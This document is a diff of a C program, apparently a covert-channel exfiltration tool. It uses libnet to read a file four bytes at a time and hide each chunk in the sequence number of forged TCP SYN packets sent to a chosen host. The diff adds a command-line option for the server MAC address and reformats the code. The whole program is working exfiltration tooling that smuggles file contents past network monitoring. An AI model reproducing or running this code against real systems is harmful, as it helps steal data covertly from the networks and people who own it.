@@ -22,10 +22,9 @@
 #include <sys/stat.h>
 #include <fcntl.h>
 
-#define VERSION "1.2"
 
 void usage(char *name) {
-	fprintf(stderr, "usage: %s -i interface -d dst_ip -f file_to_exfiltrate -p dst_port -P src_port\n", name);
+	fprintf(stderr, "usage: %s -i interface -d dst_ip -f file_to_exfiltrate -p dst_port -P src_port -m MAC_address_server\n", name);
 }
 
 void error(char *cmd, char *name) {
@@ -34,55 +33,49 @@ void error(char *cmd, char *name) {
 }
 
 void lerror(char *msg, libnet_t *l) {
-    fprintf(stderr, "libnet error: %s.\n", msg);
-    libnet_destroy(l);
-    exit(EXIT_FAILURE);
+	fprintf(stderr, "libnet error: %s.\n", msg);
+	libnet_destroy(l);
+	exit(EXIT_FAILURE);
 }
 
 int main(int argc, char *argv[]) {
-	int c;
+	int c, fd, seq, pkt;
 	libnet_t *l, *q;
 	libnet_ptag_t t;
 	char *payload;
 	u_short payload_s;
 	u_long src_ip, dst_ip;
 	u_short src_prt, dst_prt;
-	char errbuf[LIBNET_ERRBUF_SIZE];
-	int fd;
-	char buf[5];
-    char devname[64], file[128];
-    int seq;
-    int pkt;
-    u_char enet_src[6];
-    // Write below server MAC address: TODO do it automatic....
-    u_char enet_dst[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
-    struct libnet_ether_addr *mac_src;
-    
+	char errbuf[LIBNET_ERRBUF_SIZE], buf[5], devname[64], file[128], macaddr[32];
+	u_char enet_src[6], enet_dst[6];
+	struct libnet_ether_addr *mac_src;
+	
 	src_ip  = 0;
 	dst_ip  = 0;
 	src_prt = 0;
 	dst_prt = 0;
 	payload = NULL;
 	payload_s = 0;
-    pkt= 1;
-    devname[0]= '\0';
-    file[0]= '\0';
-    
-    
+	pkt= 1;
+	devname[0]= '\0';
+	file[0]= '\0';
+	macaddr[0]= '\0';
+	
+	
 	if (getuid() != 0) {
 		error(argv[0], "Sorry you must be root.");
 	}
-    
-    q = libnet_init(LIBNET_LINK, NULL, errbuf);
-    if (q == NULL) {
-        error(argv[0], "libnet_init() failed\n"); 
-    }
-    
-	while ((c = getopt(argc, argv, "i:d:f:p:P:")) != EOF) {
+	
+	q = libnet_init(LIBNET_LINK, NULL, errbuf);
+	if (q == NULL) {
+		error(argv[0], "libnet_init() failed\n"); 
+	}
+	
+	while ((c = getopt(argc, argv, "i:d:f:p:P:m:")) != EOF) {
 		switch (c) {
 			case 'i':
-                strncpy(devname, optarg, sizeof(devname)-1);
-                fprintf(stderr, "using interface: %s\n", devname);
+				strncpy(devname, optarg, sizeof(devname)-1);
+				fprintf(stderr, "using interface: %s\n", devname);
 				break;
 			case 'd':
 				if ((dst_ip = libnet_name2addr4(q, optarg, LIBNET_RESOLVE)) == -1) {
@@ -90,22 +83,26 @@ int main(int argc, char *argv[]) {
 					exit(EXIT_FAILURE);
 				}
 				break;
-    		case 'f':
-                strncpy(file, optarg, sizeof(file)-1);
+			case 'f':
+				strncpy(file, optarg, sizeof(file)-1);
 				break;
 			case 'p':
-                dst_prt= (u_short)atoi(optarg);
+				dst_prt= (u_short)atoi(optarg);
 				break;
-            case 'P':
-                src_prt= (u_short)atoi(optarg);
-                break;
+			case 'P':
+				src_prt= (u_short)atoi(optarg);
+				break;
+			case 'm':
+				strncpy(macaddr, optarg, sizeof(macaddr)-1);
+				sscanf(optarg, "%02X:%02X:%02X:%02X:%02X:%02X", &enet_dst[0],&enet_dst[1],&enet_dst[2],&enet_dst[3],&enet_dst[4],&enet_dst[5]);
+				break;
 			default:
 				exit(EXIT_FAILURE);
 		}
 	}
-    libnet_destroy(q);
+	libnet_destroy(q);
 
-	if (*devname == '\0' || !dst_ip || *file == '\0' || !src_prt ||  !dst_prt) {
+	if (*devname == '\0' || !dst_ip || *file == '\0' || !src_prt ||  !dst_prt || *macaddr == '\0') {
 		usage(argv[0]);
 		exit(EXIT_FAILURE);
 	}
@@ -114,115 +111,111 @@ int main(int argc, char *argv[]) {
 	if (fd == -1) {
 		 error(argv[0], "Could not open file\n");
 	}
-    
+	
 	while ( 1 ) {
-        l = libnet_init(
-                LIBNET_LINK,                            /* injection type */
-                devname,                                /* network interface */
-                errbuf);                                /* error buffer */
-    
-        if (l == NULL) {
-            error(argv[0], "libnet_init() failed\n"); 
-        }
+		l = libnet_init(
+				LIBNET_LINK,                            /* injection type */
+				devname,                                /* network interface */
+				errbuf);                                /* error buffer */
+	
+		if (l == NULL) {
+			error(argv[0], "libnet_init() failed\n"); 
+		}
 
-    	if ( read(fd, &buf, 4) < 1 ) {
-            break;
-        }
-        buf[4]= '\0';
-                
-        fprintf(stderr, "#%d\t", pkt++);
+		if ( read(fd, &buf, 4) < 1 ) {
+			break;
+		}
+		buf[4]= '\0';
+				
+		fprintf(stderr, "#%d\t", pkt++);
 		fprintf(stderr, " [Read from file \"%s\"] ", buf);
-        // Encoding 4 bytes in an integer
-        seq= buf[0] << 24 | buf[1] << 16 | buf[2] << 8 | buf[3];
-        fprintf(stderr, "[Encoded SEQ nr: 0x%x] ", seq);
+		// Encoding 4 bytes in an integer
+		seq= buf[0] << 24 | buf[1] << 16 | buf[2] << 8 | buf[3];
+		fprintf(stderr, "[Encoded SEQ #: 0x%x] ", seq);
 
 		t = libnet_build_tcp_options(
-            (uint8_t*)"\003\003\012\001\002\004\001\011\010\012\077\077\077\077\000\000\000\000\000\000", // 20 bytes, decode with Wireshark
-            20,
-            l,
-            0);
-        
+			(uint8_t*)"\003\003\012\001\002\004\001\011\010\012\077\077\077\077\000\000\000\000\000\000", // TCP header, 20 bytes, decode with Wireshark
+			20,
+			l,
+			0);
+		
 		if (t == -1) {
-            lerror("Can't build TCP options", l);
+			lerror("Can't build TCP options", l);
 		}
 
 		t = libnet_build_tcp(
-            src_prt,                                    /* source port */
-            dst_prt,                                    /* destination port */
-            seq,                                        /* sequence number */
-            0x00000000,                                 /* acknowledgement num */
-            TH_SYN,                                     /* control flags */
-            32767,                                      /* window size */
-            0,                                          /* checksum */
-            0,                                          /* urgent pointer */
-            LIBNET_TCP_H + 20 + payload_s,              /* TCP packet size */
-            (uint8_t*)payload,                          /* payload */
-            payload_s,                                  /* payload size */
-            l,                                          /* libnet handle */
-            0);                                         /* libnet id */
-        
+			src_prt,                                    /* source port */
+			dst_prt,                                    /* destination port */
+			seq,                                        /* sequence number */
+			0x00000000,                                 /* acknowledgement num */
+			TH_SYN,                                     /* control flags */
+			32767,                                      /* window size */
+			0,                                          /* checksum */
+			0,                                          /* urgent pointer */
+			LIBNET_TCP_H + 20 + payload_s,              /* TCP packet size */
+			(uint8_t*)payload,                          /* payload */
+			payload_s,                                  /* payload size */
+			l,                                          /* libnet handle */
+			0);                                         /* libnet id */
+		
 		if (t == -1) {
-            lerror("Can't build TCP header", l);
+			lerror("Can't build TCP header", l);
 		}
 	
 		t = libnet_build_ipv4(
-            LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,  /* length */
+			LIBNET_IPV4_H + LIBNET_TCP_H + 20 + payload_s,  /* length */
 			0,                                          /* TOS */
-            242,                                        /* IP ID */
-            0,                                          /* IP Frag */
-            64,                                         /* TTL */
-            IPPROTO_TCP,                                /* protocol */
-            0,                                          /* checksum */
-            src_ip,                                     /* source IP */
-            dst_ip,                                     /* destination IP */
-            NULL,                                       /* payload */
-            0,                                          /* payload size */
-            l,                                          /* libnet handle */
-            0);                                         /* libnet id */
+			242,                                        /* IP ID */
+			0,                                          /* IP Frag */
+			64,                                         /* TTL */
+			IPPROTO_TCP,                                /* protocol */
+			0,                                          /* checksum */
+			src_ip,                                     /* source IP */
+			dst_ip,                                     /* destination IP */
+			NULL,                                       /* payload */
+			0,                                          /* payload size */
+			l,                                          /* libnet handle */
+			0);                                         /* libnet id */
 
 		if (t == -1) {
-            lerror("Can't build IP header", l);
+			lerror("Can't build IP header", l);
 		}
-        
-        if ((mac_src = libnet_get_hwaddr(l)) == NULL) {
-    		lerror("Unable to determine own MAC address", l);
-        }
-        enet_src[0]= mac_src->ether_addr_octet[0];
-        enet_src[1]= mac_src->ether_addr_octet[1];
-        enet_src[2]= mac_src->ether_addr_octet[2];
-        enet_src[3]= mac_src->ether_addr_octet[3];
-        enet_src[4]= mac_src->ether_addr_octet[4];
-        enet_src[5]= mac_src->ether_addr_octet[5];
+		
+		if ((mac_src = libnet_get_hwaddr(l)) == NULL) {
+			lerror("Unable to determine own MAC address", l);
+		}
+		enet_src[0]= mac_src->ether_addr_octet[0];
+		enet_src[1]= mac_src->ether_addr_octet[1];
+		enet_src[2]= mac_src->ether_addr_octet[2];
+		enet_src[3]= mac_src->ether_addr_octet[3];
+		enet_src[4]= mac_src->ether_addr_octet[4];
+		enet_src[5]= mac_src->ether_addr_octet[5];
 
-        if ((src_ip = libnet_get_ipaddr4(l)) == -1) {
-    		lerror("Unable to determine own IP address", l);
-        }
+		if ((src_ip = libnet_get_ipaddr4(l)) == -1) {
+			lerror("Unable to determine own IP address", l);
+		}
 
 		t = libnet_build_ethernet(
-            enet_dst,                                   /* ethernet destination */
-            enet_src,                                   /* ethernet source */
-            ETHERTYPE_IP,                               /* protocol type */
-            NULL,                                       /* payload */
-            0,                                          /* payload size */
-            l,                                          /* libnet handle */
-            0);                                         /* libnet id */
+			enet_dst,                                   /* ethernet destination */
+			enet_src,                                   /* ethernet source */
+			ETHERTYPE_IP,                               /* protocol type */
+			NULL,                                       /* payload */
+			0,                                          /* payload size */
+			l,                                          /* libnet handle */
+			0);                                         /* libnet id */
 
 		if (t == -1) {
-            lerror("Can't build ethernet header", l);
+			lerror("Can't build ethernet header", l);
 		}
 	
-		/*
-		 *  Write it to the wire.
-		 */
 		c = libnet_write(l);
 		if (c == -1) {
 			lerror("Write error", l);
-		}
-		else {
+		} else {
 			fprintf(stderr, "[Wrote %d bytes]\n", c);
 		}
-        libnet_destroy(l);
-        l= 0;
+		libnet_destroy(l);
+		l= 0;
 	} /* while */
 	close(fd);
 	return (EXIT_SUCCESS);
